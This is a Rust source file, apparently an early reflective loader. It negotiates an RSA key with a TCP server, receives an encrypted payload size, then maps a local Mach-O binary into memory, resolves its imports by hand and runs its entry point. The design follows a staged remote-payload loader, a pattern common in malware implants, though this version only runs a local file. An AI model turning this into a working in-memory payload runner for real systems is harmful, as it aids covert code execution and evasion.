use std::ffi::CString;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use loader::VM;
use relocs::RelocationKind;
use rsa::pkcs8::EncodePublicKey;
use rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use object::{LittleEndian, Object, ObjectSection, ObjectSegment};
use object::read::macho::MachOFile64;

mod relocs;
mod loader;

#[derive(Debug)]
pub enum Error {
    Connect,
    StreamRead,
    StreamWrite,
    StreamClosed,
    PubkeyCorrupt,
    Decryption,
    SegmentRead,
    LoadLibrary,
    LoadSymbol,
}

const ENC_SIZE: usize = 256;

fn write_flattened_binary(obj: &MachOFile64<LittleEndian>) -> Result<VM, loader::Error> {
    let mut segments = Vec::new();
    for segment in obj.segments() {
        if let Ok(Some("__PAGEZERO")) = segment.name() {
            continue;
        }
        segments.push((segment.address(), segment.size(), segment.data().unwrap()));
    }

    if segments.is_empty() {
        panic!("empty binary");
    }

    segments.sort_unstable_by_key(|&(addr, ..)| addr);

    // let size_estimate = (segments[segments.len() - 1].0 - segments[0].0) as usize;
    let mut vm = VM::new(1024 * 1024 * 64)?;

    let mut end_of_prev_segment = segments[0].0;
    for (addr, _, bytes) in segments {
        let pad_size = addr - end_of_prev_segment;
        if pad_size > 0 {
            vm.alloc(pad_size as usize)?.set_value(0);
        }
        vm.alloc(bytes.len())?.write_slice(bytes)?;
        end_of_prev_segment = addr + bytes.len() as u64;
    }

    Ok(vm)
}

fn load_lib_and_func(library: &str, sym_name: &str) -> Result<u64, Error> {
    let c_lib = CString::new(library).map_err(|_| Error::LoadLibrary)?;
    let lib = unsafe { libc::dlopen(c_lib.as_ptr(), libc::RTLD_NOW) };
    if lib.is_null() {
        return Err(Error::LoadLibrary);
    }

    let sym_name = sym_name.strip_prefix("_").unwrap_or(sym_name); // this is scuffed
    let c_sym_name = CString::new(sym_name).map_err(|_| Error::LoadSymbol)?;
    let func = unsafe { libc::dlsym(lib, c_sym_name.as_ptr()) };
    if lib.is_null() {
        return Err(Error::LoadSymbol);
    }

    Ok(func as u64)
}

// format:
//
// sections* ->
//  relocation*
//  alignment
//  addr
//  data
fn load_bin() {
    let mut path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    path.push("../simple");

    let mut file = std::fs::File::open(path).unwrap();
    let mut data = Vec::new();
    file.read_to_end(&mut data).unwrap();

    let obj = MachOFile64::<LittleEndian>::parse(&*data).unwrap();

    for section in obj.sections() {
        if section.relocations().next().is_some() {
            panic!("No support for traditional relocations.");
        }
    }

    let mut vm = write_flattened_binary(&obj).unwrap();

    for reloc in relocs::parse_chained_fixups(&obj).unwrap() {
        match reloc.kind {
            RelocationKind::Bind { mut value } => {
                value += vm.address();
                vm.write(reloc.target, &value).unwrap();
            }
            RelocationKind::RebaseLocal { .. } => todo!("rebase local"),
            RelocationKind::RebaseExtern { library, sym_name, weak } => {
                match load_lib_and_func(library, sym_name) {
                    Err(err) if weak => {
                        println!("{err:?}");
                        continue;
                    }
                    Err(err) => panic!("{err:?}"),
                    Ok(func) => {
                        vm.write(reloc.target, &func).unwrap();
                    }
                }

            }
        }
    }

    // 0x0000000000003e60
    let exit_code = unsafe { vm.exec(obj.entry()).unwrap() };
    println!("Program exited with code: {exit_code}");
}

fn main() -> Result<(), Error> {
    println!("Generating key pair.");
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);

    let addr = "0.0.0.0:3771".parse().unwrap();
    let timeout = Duration::from_secs(3);
    let mut stream = TcpStream::connect_timeout(&addr, timeout).map_err(|_| Error::Connect)?;
    println!("Connected to the server!");

    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));

    let pub_key_encoded = pub_key
        .to_public_key_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|_| Error::PubkeyCorrupt)?;

    stream
        .write_all(pub_key_encoded.as_bytes())
        .map_err(|_| Error::StreamWrite)?;
    println!("Send public key.");

    let mut payload_len = [0; ENC_SIZE];
    stream
        .read_exact(&mut payload_len)
        .map_err(|_| Error::StreamRead)?;

    let payload_len = priv_key
        .decrypt(Pkcs1v15Encrypt, &payload_len)
        .map_err(|_| Error::Decryption)?;
    let payload_len = u64::from_be_bytes(payload_len.try_into().unwrap());

    println!("Received payload size {payload_len}.");

    load_bin();

    Ok(())
}
